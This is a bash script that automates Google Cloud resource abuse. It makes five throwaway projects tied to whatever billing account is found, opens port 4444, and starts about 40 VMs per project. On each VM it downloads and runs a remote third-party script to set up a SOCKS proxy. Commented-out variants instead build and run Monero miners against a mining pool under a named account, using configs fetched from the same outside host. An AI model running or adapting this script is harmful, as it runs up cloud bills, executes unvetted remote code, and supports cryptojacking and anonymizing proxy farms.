#!/bin/bash

EMAIL=$(gcloud auth list --format=json | jq -r '.[0].account')
for (( j=1; j<6; j++ ));
do
echo "[$j] Creating project $PROJECT_ID for $EMAIL ... "
PROJECT_PREFIX=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 8 | head -n 1)

PROJECT_ID=$(echo "${PROJECT_PREFIX}-$RANDOM")
echo "Creating project $PROJECT_ID for $EMAIL ... "

# create
gcloud projects create $PROJECT_ID

gcloud projects add-iam-policy-binding $PROJECT_ID --member="user:$EMAIL" --role='roles/owner'
gcloud config set project $PROJECT_ID
ACCOUNT_ID=$(gcloud alpha billing accounts list --format=json | jq -M -r '.[0].name' | cut -f2 -d"/")
sleep 2
gcloud alpha billing projects link $PROJECT_ID --billing-account=$ACCOUNT_ID

gcloud services enable --project $PROJECT_ID cloudbilling.googleapis.com
gcloud services enable --project $PROJECT_ID cloudapis.googleapis.com
gcloud services enable --project $PROJECT_ID dns.googleapis.com
gcloud services enable --project $PROJECT_ID compute.googleapis.com
gcloud compute firewall-rules create socks --allow tcp:4444  --description="open_port_4444"


PROJECT_NUM=$(gcloud projects describe $PROJECT_ID --format=json | jq -r '.projectNumber')

declare -a array=("us-east4-a" "us-west1-a" "us-central1-c" "us-east1-b" "us-east4-a" "us-west1-a" "us-central1-c" "us-east1-b" "us-east4-a" "us-west1-a" "us-central1-c" "us-east1-b" "us-east4-a" "us-west1-a" "us-central1-c" "us-east1-b" "us-east4-a" "us-west1-a" "us-central1-c" "us-east1-b" "us-east4-a" "us-west1-a" "us-central1-c" "us-east1-b" "us-east4-a" "us-west1-a" "us-central1-c" "us-east1-b" "us-east4-a" "us-west1-a" "us-central1-c" "us-east1-b" "us-east4-a" "us-west1-a" "us-central1-c" "us-east1-b" "us-east4-a" "us-west1-a" "us-central1-c" "us-east1-b")
arraylength=${#array[@]}

if [ -e ~/.ssh/google_compute_engine ]
then
    echo "google_compute_engine ok"
else
    ssh-keygen -q -N "" -f ~/.ssh/google_compute_engine
fi

## now loop through the above array
for (( i=1; i<${arraylength}+1; i++ ));
do
  #( 
    gcloud compute --project $PROJECT_ID instances create "instance-$i" --zone ${array[$i-1]} --machine-type "n1-standard-1" --subnet "default" --maintenance-policy "MIGRATE" --service-account "$PROJECT_NUM-compute@developer.gserviceaccount.com" --scopes "https://www.googleapis.com/auth/devstorage.read_only","https://www.googleapis.com/auth/logging.write","https://www.googleapis.com/auth/monitoring.write","https://www.googleapis.com/auth/servicecontrol","https://www.googleapis.com/auth/service.management.readonly","https://www.googleapis.com/auth/trace.append" --image "debian-9-stretch-v20170829" --image-project "debian-cloud" --boot-disk-size "10" --boot-disk-type "pd-standard" --boot-disk-device-name "instance-$i"
    gcloud beta compute ssh "instance-$i" --zone ${array[$i-1]} --quiet --command "sudo wget -O socks.sh https://raw.githubusercontent.com/adv-zl/adv-zl.github.io/master/dante.sh && sudo chmod +x socks.sh && ./socks.sh" 
    
    #gcloud compute --project $PROJECT_ID instances create "instance-$i" --zone ${array[$i-1]} --machine-type "n1-highcpu-8" --subnet "default" --maintenance-policy "MIGRATE" --service-account "$PROJECT_NUM-compute@developer.gserviceaccount.com" --scopes "https://www.googleapis.com/auth/devstorage.read_only","https://www.googleapis.com/auth/logging.write","https://www.googleapis.com/auth/monitoring.write","https://www.googleapis.com/auth/servicecontrol","https://www.googleapis.com/auth/service.management.readonly","https://www.googleapis.com/auth/trace.append" --image "debian-9-stretch-v20170829" --image-project "debian-cloud" --boot-disk-size "10" --boot-disk-type "pd-standard" --boot-disk-device-name "instance-$i"
     #gcloud beta compute ssh "instance-$i" --zone ${array[$i-1]} --quiet --command "sudo apt install libmicrohttpd-dev libssl-dev cmake build-essential unzip libhwloc-dev htop git tmux wget -y && wget https://github.com/adv-zl/xmr-stak-cpu/archive/master.zip && unzip master.zip && cd ./xmr-stak-cpu-master && cmake . && sudo sysctl -w vm.nr_hugepages=128 && make install && cd bin && wget -N https://raw.githubusercontent.com/adv-zl/adv-zl.github.io/master/config.txt && sudo tmux new -d ./xmr-stak-cpu" 
    #gcloud compute --project $PROJECT_ID instances create "instance-$i" --zone ${array[$i-1]} --machine-type "n1-standard-8" --subnet "default" --maintenance-policy "MIGRATE" --service-account "$PROJECT_NUM-compute@developer.gserviceaccount.com" --scopes "https://www.googleapis.com/auth/devstorage.read_only","https://www.googleapis.com/auth/logging.write","https://www.googleapis.com/auth/monitoring.write","https://www.googleapis.com/auth/servicecontrol","https://www.googleapis.com/auth/service.management.readonly","https://www.googleapis.com/auth/trace.append" --image "debian-9-stretch-v20170829" --image-project "debian-cloud" --boot-disk-size "10" --boot-disk-type "pd-standard" --boot-disk-device-name "instance-$i"
   # gcloud beta compute ssh "instance-$i" --zone ${array[$i-1]} --command "sudo apt-get install screen git unzip build-essential autotools-dev autoconf libcurl3 libcurl4-gnutls-dev automake -y && wget https://github.com/OhGodAPet/cpuminer-multi/archive/master.zip && unzip master.zip && cd ./cpuminer-multi-master && ./autogen.sh && CFLAGS=\"-march=native\" ./configure && make && nohup ./minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u englandnancy09@gmail.com -p x -t 14 2>&1 && exit" --ssh-flag="-f"
     # gcloud beta compute ssh "instance-$i" --zone ${array[$i-1]} --quiet --command "sudo apt-get install git unzip tmux build-essential cmake libuv1-dev -y && wget https://github.com/xmrig/xmrig/archive/master.zip && unzip master.zip && cd ./xmrig-master && mkdir build && cd build && cmake .. && make && wget https://raw.githubusercontent.com/adv-zl/adv-zl.github.io/master/config.json && tmux new -d ./xmrig" 
      #) &

   # or do whatever with individual element of the array
done
wait
done
